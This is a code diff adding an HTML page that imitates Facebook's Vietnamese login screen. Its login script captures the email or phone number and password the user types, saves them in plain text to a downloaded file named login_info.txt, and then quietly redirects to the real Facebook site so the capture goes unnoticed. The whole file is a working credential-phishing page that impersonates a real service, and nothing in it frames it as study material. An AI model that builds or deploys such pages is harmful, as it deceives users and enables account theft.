@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            width: 980px;
+            margin: 0 auto;
+        }
+
+        .left-section {
+            flex: 0 0 540px;
+            padding-right: 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: center;
+        }
+
+        .logo {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-size: 52px;
+            color: #1877f2;
+            margin-bottom: 4px;
+        }
+
+        .tagline {
+            font-size: 28px;
+            line-height: 36px;
+            margin-top: 0;
+        }
+
+        .left-text-wrapper {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
+        }
+
+        .right-section {
+            flex: 0 0 396px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.06);
+            padding: 20px;
+            width: 396px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-field {
+            padding: 14px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: #fff;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 16px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+        }
+
+        .login-button:hover {
+            background-color: #166fe6;
+        }
+
+        .forgot-password {
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 24px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .create-account-button {
+            background-color: #42b72a;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none; /* Loại bỏ gạch chân mặc định của thẻ <a> */
+            display: inline-block; /* Để nút có kích thước theo nội dung */
+        }
+
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+
+        .create-page {
+            text-align: center;
+            font-size: 14px;
+            color: #1c1e21;
+            margin-top: 20px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        .input-field.error {
+            border-color: red;
+        }
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="left-text-wrapper">
+                <h1 class="logo">facebook</h1>
+                <p class="tagline">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</p>
+            </div>
+        </div>
+        <div class="right-section">
+            <div class="login-wrapper">
+                <div class="login-box">
+                    <input type="text" id="email" class="input-field" placeholder="Email hoặc số điện thoại" required>
+                    <div id="emailError" class="error-message"></div>
+                    <input type="password" id="password" class="input-field" placeholder="Mật khẩu" required>
+                    <div id="passwordError" class="error-message"></div>
+                    <button class="login-button" onclick="handleLogin()">Đăng nhập</button>
+                    <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="forgot-password">Quên mật khẩu?</a>
+                    <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;">
+                    <div class="create-account">
+                        <a href="https://web.facebook.com/r.php?entry_point=login" class="create-account-button">Tạo tài khoản mới</a>
+                    </div>
+                </div>
+                <div class="create-page">
+                    <a href="https://web.facebook.com/pages/create/?ref_type=registration_form"><b>Tạo Trang</b></a> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleLogin() {
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailError = document.getElementById('emailError');
+            const passwordError = document.getElementById('passwordError');
+            let isValid = true;
+
+            // Reset trạng thái lỗi
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+            emailError.textContent = "";
+            passwordError.textContent = "";
+
+            if (emailInput.value.trim() === "") {
+                emailInput.classList.add('error');
+                emailError.textContent = "Vui lòng nhập Email hoặc số điện thoại.";
+                isValid = false;
+            }
+
+            if (passwordInput.value.trim() === "") {
+                passwordInput.classList.add('error');
+                passwordError.textContent = "Vui lòng nhập Mật khẩu.";
+                isValid = false;
+            }
+
+            if (!isValid) {
+                return; // Ngăn chặn việc tải xuống và chuyển hướng nếu có lỗi
+            }
+
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            const data = "Email: " + email + "\nMật khẩu: " + password;
+            const filename = "login_info.txt";
+            const redirectURL = "https://web.facebook.com/";
+
+            // Tạo Blob và URL cho việc tải xuống
+            const blob = new Blob([data], { type: 'text/plain' });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            window.URL.revokeObjectURL(url);
+
+            // Chuyển hướng sau một khoảng thời gian ngắn
+            setTimeout(() => {
+                window.location.href = redirectURL;
+            }, 500);
+        }
+    </script>
+</body>
+</html>
